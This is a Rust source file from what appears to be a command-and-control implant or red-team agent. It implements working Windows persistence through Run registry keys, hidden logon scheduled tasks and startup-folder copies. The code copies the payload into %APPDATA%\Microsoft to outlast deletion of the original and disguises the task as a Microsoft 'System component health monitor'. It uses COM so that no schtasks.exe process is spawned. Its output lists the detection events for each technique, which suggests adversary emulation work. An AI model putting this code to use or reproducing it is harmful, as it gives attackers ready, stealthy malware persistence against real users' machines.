// src/agent/persistence/windows.rs
//
// Windows persistence implementations.
//
// Registry operations use raw Win32 via extern "system" — no extra crates,
// consistent with the pattern in migrate.rs and injection/windows/.
//
// Scheduled tasks use the COM ITaskService API (windows crate) to avoid
// spawning schtasks.exe as a child process. The XML-based RegisterTask path
// means we only need ITaskService and ITaskFolder from the COM hierarchy.

#![cfg(target_os = "windows")]

use std::ffi::OsStr;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;

// ── Win32 registry FFI ─────────────────────────────────────────────────

const HKCU: isize = -2147483647i32 as isize; // 0x80000001
const HKLM: isize = -2147483646i32 as isize; // 0x80000002
const KEY_SET_VALUE: u32 = 0x0002;
const KEY_READ: u32 = 0x20019;
const REG_OPTION_NON_VOLATILE: u32 = 0;
const REG_SZ: u32 = 1;
const ERROR_SUCCESS: i32 = 0;
const ERROR_FILE_NOT_FOUND: i32 = 2;
const MAX_PATH: usize = 260;

extern "system" {
    fn RegCreateKeyExW(
        hKey: isize,
        lpSubKey: *const u16,
        Reserved: u32,
        lpClass: *const u16,
        dwOptions: u32,
        samDesired: u32,
        lpSecurityAttributes: *const u8,
        phkResult: *mut isize,
        lpdwDisposition: *mut u32,
    ) -> i32;

    fn RegOpenKeyExW(
        hKey: isize,
        lpSubKey: *const u16,
        ulOptions: u32,
        samDesired: u32,
        phkResult: *mut isize,
    ) -> i32;

    fn RegSetValueExW(
        hKey: isize,
        lpValueName: *const u16,
        Reserved: u32,
        dwType: u32,
        lpData: *const u8,
        cbData: u32,
    ) -> i32;

    fn RegDeleteValueW(hKey: isize, lpValueName: *const u16) -> i32;

    fn RegQueryValueExW(
        hKey: isize,
        lpValueName: *const u16,
        lpReserved: *const u32,
        lpType: *mut u32,
        lpData: *mut u8,
        lpcbData: *mut u32,
    ) -> i32;

    fn RegEnumValueW(
        hKey: isize,
        dwIndex: u32,
        lpValueName: *mut u16,
        lpcchValueName: *mut u32,
        lpReserved: *const u32,
        lpType: *mut u32,
        lpData: *mut u8,
        lpcbData: *mut u32,
    ) -> i32;

    fn RegCloseKey(hKey: isize) -> i32;
}

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(once(0u16)).collect()
}

fn from_wide_nul(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

// ── Stable drop location ──────────────────────────────────────────────
//
// Copies `source` to %APPDATA%\Microsoft\<name><ext> so persistence
// points at a path that survives the operator deleting the original.
// Preserves the source extension (.exe / .dll); falls back to .exe.
// Returns the destination path. No-ops if source is already there.

fn stable_drop(source: &str, name: &str) -> Result<String, String> {
    let appdata = std::env::var("APPDATA")
        .map_err(|_| "APPDATA environment variable not set".to_string())?;

    let ext = std::path::Path::new(source)
        .extension()
        .map(|e| format!(".{}", e.to_string_lossy()))
        .unwrap_or_else(|| ".exe".to_string());

    let dst = format!("{}\\Microsoft\\{}{}", appdata, name, ext);

    // Skip copy if already at destination (canonicalize handles symlinks)
    let already = std::fs::canonicalize(source)
        .ok()
        .zip(std::fs::canonicalize(&dst).ok())
        .map(|(a, b)| a == b)
        .unwrap_or(false);

    if !already {
        std::fs::copy(source, &dst)
            .map_err(|e| format!("stable_drop: {} → {}: {}", source, dst, e))?;
    }

    Ok(dst)
}

const RUN_SUBKEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";

// ── T1547.001 — Registry Run Key ──────────────────────────────────────

pub fn install_run(value_name: &str, binary_path: &str, use_hklm: bool) -> Result<String, String> {
    let stable = stable_drop(binary_path, value_name)?;

    let root = if use_hklm { HKLM } else { HKCU };
    let subkey_w = to_wide(RUN_SUBKEY);
    let name_w   = to_wide(value_name);
    let data_w   = to_wide(&stable);
    // REG_SZ data includes the null terminator; len() is in u16 units
    let data_bytes = unsafe {
        std::slice::from_raw_parts(data_w.as_ptr() as *const u8, data_w.len() * 2)
    };

    let mut hkey: isize = 0;
    let mut disp: u32 = 0;

    let rc = unsafe {
        RegCreateKeyExW(
            root,
            subkey_w.as_ptr(),
            0,
            std::ptr::null(),
            REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE,
            std::ptr::null(),
            &mut hkey,
            &mut disp,
        )
    };
    if rc != ERROR_SUCCESS {
        return Err(format!("RegCreateKeyExW failed ({})", rc));
    }

    let rc2 = unsafe {
        RegSetValueExW(
            hkey,
            name_w.as_ptr(),
            0,
            REG_SZ,
            data_bytes.as_ptr(),
            data_bytes.len() as u32,
        )
    };
    unsafe { RegCloseKey(hkey); }

    if rc2 != ERROR_SUCCESS {
        return Err(format!("RegSetValueExW failed ({})", rc2));
    }

    let hive = if use_hklm { "HKLM" } else { "HKCU" };
    Ok(format!(
        "[+] Run key installed\n    Copied: {} → {stable}\n    Hive:  {hive}\n    Key:   {RUN_SUBKEY}\n    Value: {value_name}\n    Data:  {stable}\n    \
         Detection: Sysmon 12/13 (registry), ETW Kernel-Registry",
        binary_path
    ))
}

pub fn remove_run(value_name: &str, use_hklm: bool) -> Result<String, String> {
    let root = if use_hklm { HKLM } else { HKCU };
    let subkey_w = to_wide(RUN_SUBKEY);
    let name_w   = to_wide(value_name);

    let mut hkey: isize = 0;
    let rc = unsafe {
        RegOpenKeyExW(root, subkey_w.as_ptr(), 0, KEY_SET_VALUE, &mut hkey)
    };
    if rc != ERROR_SUCCESS {
        return Err(format!("RegOpenKeyExW failed ({})", rc));
    }

    let rc2 = unsafe { RegDeleteValueW(hkey, name_w.as_ptr()) };
    unsafe { RegCloseKey(hkey); }

    match rc2 {
        r if r == ERROR_SUCCESS        => Ok(format!("[+] Run value '{value_name}' removed")),
        r if r == ERROR_FILE_NOT_FOUND => Err(format!("Value '{value_name}' not found")),
        r                              => Err(format!("RegDeleteValueW failed ({})", r)),
    }
}

// ── T1053.005 — Scheduled Task ────────────────────────────────────────
//
// MSVC builds use the COM ITaskService API (windows crate) — no schtasks.exe
// child process is spawned.
//
// MinGW / cross-compiled builds (x86_64-pc-windows-gnu, used by the Docker
// builder) fall back to schtasks.exe because the windows crate 0.52 is
// MSVC-only and fails to link against the GNU import libraries.

#[cfg(target_env = "msvc")]
use windows::{
    core::BSTR,
    Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CoUninitialize,
        CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
    },
    Win32::System::TaskScheduler::{
        ITaskFolder, ITaskService, TaskScheduler,
        TASK_CREATE_OR_UPDATE, TASK_LOGON_INTERACTIVE_TOKEN,
    },
};

fn build_task_xml(binary_path: &str) -> String {
    // Logon trigger, least-privilege, hidden, no execution time limit.
    // <Hidden> suppresses the task from the Task Scheduler UI — commonly
    // used by both attackers and legitimate maintenance software.
    format!(
        r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System component health monitor</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principal id="Author">
    <LogonType>InteractiveToken</LogonType>
    <RunLevel>LeastPrivilege</RunLevel>
  </Principal>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{binary_path}</Command>
    </Exec>
  </Actions>
</Task>"#
    )
}

pub fn install_task(task_name: &str, binary_path: &str) -> Result<String, String> {
    let stable = stable_drop(binary_path, task_name)?;

    #[cfg(target_env = "msvc")]
    {
        unsafe {
            let co_init_rc = CoInitializeEx(None, COINIT_MULTITHREADED);
            let we_initialized = co_init_rc.is_ok();
            let result = install_task_com(task_name, &stable);
            if we_initialized { CoUninitialize(); }
            return result.map(|msg| format!("    Copied: {} → {stable}\n{msg}", binary_path));
        }
    }

    #[cfg(not(target_env = "msvc"))]
    install_task_schtasks(task_name, &stable, binary_path)
}

/// COM-based task creation — MSVC builds only.
#[cfg(target_env = "msvc")]
unsafe fn install_task_com(task_name: &str, binary_path: &str) -> Result<String, String> {
    let svc: ITaskService =
        CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER)
            .map_err(|e| format!("CoCreateInstance ITaskService: {e}"))?;

    svc.Connect(None, None, None, None)
        .map_err(|e| format!("ITaskService::Connect: {e}"))?;

    let folder: ITaskFolder = svc
        .GetFolder(&BSTR::from("\\"))
        .map_err(|e| format!("GetFolder: {e}"))?;

    let xml = build_task_xml(binary_path);

    folder
        .RegisterTask(
            &BSTR::from(task_name),
            &BSTR::from(xml.as_str()),
            TASK_CREATE_OR_UPDATE.0 as i32,
            None,
            None,
            TASK_LOGON_INTERACTIVE_TOKEN,
            None,
        )
        .map_err(|e| format!("RegisterTask: {e}"))?;

    Ok(format!(
        "[+] Scheduled task installed (COM)\n    Name:    {task_name}\n    Binary:  {binary_path}\n    Trigger: At logon (least privilege, hidden)\n    \
         Detection: Event 4698 (Security), ETW TaskScheduler/Operational 106"
    ))
}

/// schtasks.exe fallback — MinGW / cross-compiled builds.
/// Spawns a child process which is noisier than the COM path, but required
/// because the windows crate does not support x86_64-pc-windows-gnu.
#[cfg(not(target_env = "msvc"))]
fn install_task_schtasks(task_name: &str, stable_path: &str, original_path: &str) -> Result<String, String> {
    use std::process::Command;

    let rc = Command::new("schtasks")
        .args([
            "/create", "/f",
            "/sc",  "onlogon",
            "/rl",  "limited",
            "/tn",  task_name,
            "/tr",  stable_path,
        ])
        .status()
        .map_err(|e| format!("schtasks.exe: {e}"))?;

    if rc.success() {
        Ok(format!(
            "[+] Scheduled task installed (schtasks)\n    Copied:  {} → {stable_path}\n    Name:    {task_name}\n    Trigger: At logon (least privilege)\n    \
             Detection: Event 4698, ETW TaskScheduler/Operational 106, schtasks.exe process create",
            original_path
        ))
    } else {
        Err(format!("schtasks.exe exited {}", rc.code().unwrap_or(-1)))
    }
}

pub fn remove_task(task_name: &str) -> Result<String, String> {
    #[cfg(target_env = "msvc")]
    {
        unsafe {
            let co_init_rc = CoInitializeEx(None, COINIT_MULTITHREADED);
            let we_initialized = co_init_rc.is_ok();
            let result = remove_task_com(task_name);
            if we_initialized { CoUninitialize(); }
            return result;
        }
    }

    #[cfg(not(target_env = "msvc"))]
    remove_task_schtasks(task_name)
}

#[cfg(target_env = "msvc")]
unsafe fn remove_task_com(task_name: &str) -> Result<String, String> {
    let svc: ITaskService =
        CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER)
            .map_err(|e| format!("CoCreateInstance: {e}"))?;
    svc.Connect(None, None, None, None)
        .map_err(|e| format!("Connect: {e}"))?;
    let folder: ITaskFolder = svc
        .GetFolder(&BSTR::from("\\"))
        .map_err(|e| format!("GetFolder: {e}"))?;
    folder
        .DeleteTask(&BSTR::from(task_name), 0)
        .map_err(|e| format!("DeleteTask: {e}"))?;
    Ok(format!("[+] Scheduled task '{task_name}' removed"))
}

#[cfg(not(target_env = "msvc"))]
fn remove_task_schtasks(task_name: &str) -> Result<String, String> {
    use std::process::Command;
    let rc = Command::new("schtasks")
        .args(["/delete", "/f", "/tn", task_name])
        .status()
        .map_err(|e| format!("schtasks.exe: {e}"))?;
    if rc.success() {
        Ok(format!("[+] Scheduled task '{task_name}' removed"))
    } else {
        Err(format!("schtasks /delete exited {}", rc.code().unwrap_or(-1)))
    }
}

// ── T1547.009 — Startup Folder ────────────────────────────────────────
//
// Copies the binary into the current-user startup folder.
// Path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
// Executables placed directly in the startup folder are launched by
// Explorer at logon — no shortcut (.lnk) needed for PE targets.

fn startup_folder() -> Result<PathBuf, String> {
    let appdata = std::env::var("APPDATA")
        .map_err(|_| "APPDATA environment variable not set".to_string())?;
    Ok(PathBuf::from(appdata)
        .join("Microsoft")
        .join("Windows")
        .join("Start Menu")
        .join("Programs")
        .join("Startup"))
}

pub fn install_startup(file_name: &str, source_path: &str) -> Result<String, String> {
    let mut dst = startup_folder()?;
    dst.push(file_name);

    std::fs::copy(source_path, &dst)
        .map_err(|e| format!("Copy to startup folder failed: {e}"))?;

    Ok(format!(
        "[+] Startup folder persistence installed\n    Source: {source_path}\n    Dest:   {}\n    \
         Detection: Sysmon 11 (file create in startup path), ETW Kernel-File",
        dst.display()
    ))
}

pub fn remove_startup(file_name: &str) -> Result<String, String> {
    let mut dst = startup_folder()?;
    dst.push(file_name);

    std::fs::remove_file(&dst)
        .map_err(|e| format!("Remove startup file failed: {e}"))?;

    Ok(format!("[+] Removed '{}' from startup folder", dst.display()))
}

// ── Inventory ─────────────────────────────────────────────────────────

pub fn list() -> String {
    let mut out = Vec::new();

    // HKCU Run
    out.push("=== HKCU Run ===".to_string());
    out.extend(list_run_keys(false));

    // HKLM Run
    out.push("\n=== HKLM Run ===".to_string());
    out.extend(list_run_keys(true));

    // Startup folder
    out.push("\n=== Startup Folder ===".to_string());
    if let Ok(folder) = startup_folder() {
        match std::fs::read_dir(&folder) {
            Ok(entries) => {
                let files: Vec<_> = entries
                    .flatten()
                    .map(|e| format!("  {}", e.file_name().to_string_lossy()))
                    .collect();
                if files.is_empty() {
                    out.push("  (empty)".into());
                } else {
                    out.extend(files);
                }
            }
            Err(e) => out.push(format!("  Error reading startup folder: {e}")),
        }
    }

    out.join("\n")
}

fn list_run_keys(use_hklm: bool) -> Vec<String> {
    let root = if use_hklm { HKLM } else { HKCU };
    let subkey_w = to_wide(RUN_SUBKEY);
    let mut hkey: isize = 0;

    let rc = unsafe { RegOpenKeyExW(root, subkey_w.as_ptr(), 0, KEY_READ, &mut hkey) };
    if rc != ERROR_SUCCESS {
        return vec![format!("  (could not open key: {})", rc)];
    }

    let mut results = Vec::new();
    let mut index: u32 = 0;
    loop {
        let mut name_buf = vec![0u16; 256];
        let mut name_len = name_buf.len() as u32;
        let mut data_buf = vec![0u8; 1024];
        let mut data_len = data_buf.len() as u32;
        let mut vtype: u32 = 0;

        let rc = unsafe {
            RegEnumValueW(
                hkey,
                index,
                name_buf.as_mut_ptr(),
                &mut name_len,
                std::ptr::null(),
                &mut vtype,
                data_buf.as_mut_ptr(),
                &mut data_len,
            )
        };

        if rc == ERROR_FILE_NOT_FOUND {
            break; // no more values
        }
        if rc != ERROR_SUCCESS {
            break;
        }

        let name = from_wide_nul(&name_buf[..name_len as usize]);
        let data = if vtype == REG_SZ && data_len >= 2 {
            let words = unsafe {
                std::slice::from_raw_parts(data_buf.as_ptr() as *const u16, data_len as usize / 2)
            };
            from_wide_nul(words)
        } else {
            format!("(binary, {} bytes)", data_len)
        };
        results.push(format!("  {name} = {data}"));
        index += 1;
    }

    unsafe { RegCloseKey(hkey); }

    if results.is_empty() {
        results.push("  (none)".into());
    }
    results
}
